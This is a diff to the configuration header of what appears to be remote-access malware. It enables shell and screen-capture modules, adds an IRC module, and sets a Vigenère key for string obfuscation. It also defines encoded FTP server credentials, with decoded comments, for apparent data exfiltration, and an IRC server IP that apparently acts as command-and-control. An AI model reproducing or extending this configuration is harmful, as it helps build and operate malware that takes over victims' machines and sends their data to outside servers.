@@ -15,6 +15,7 @@
 // MODDEF
 #define MODSHELL_ENABLED	1
 #define MODSCREEN_ENABLED	1
+#define MODIRC_ENABLED		1
 
 // ENCDEF
 #define VIGE_KEY		"JiD2OSA9Z0cmNxQ2zcPS"
@@ -38,10 +39,24 @@
 #endif
 
 // FTPDEF
-#define FTP_HOST		"0k17^arg23^arg:21" // 0x17.net23.net:21
+#if DEBUG
+#define FTP_HOST		"0k17^arg23^arg" // 0x17.net23.net
 #define FTP_DIR			"?ine" // /var
 #define FTP_USER		"n6289090" // a6289090
 #define FTP_PASS		"dnoDeidHrGi1fr4TzpkT" // qabQrvqUeTv1se4GmcxG
+#else
+#define FTP_HOST		"0k17^arg23^arg" // 0x17.net23.net
+#define FTP_DIR			"?ine" // /var
+#define FTP_USER		"n6289090" // a6289090
+#define FTP_PASS		"dnoDeidHrGi1fr4TzpkT" // qabQrvqUeTv1se4GmcxG
+#endif
+
+// IRCDEF
+#if DEBUG
+#define IRC_HOST		"5^157^85^113" // 5^157^85^113
+#else
+#define IRC_HOST		"5^157^85^113" // 5^157^85^113
+#endif
 
 // BUILDDEF
 #define ISBUILD 1
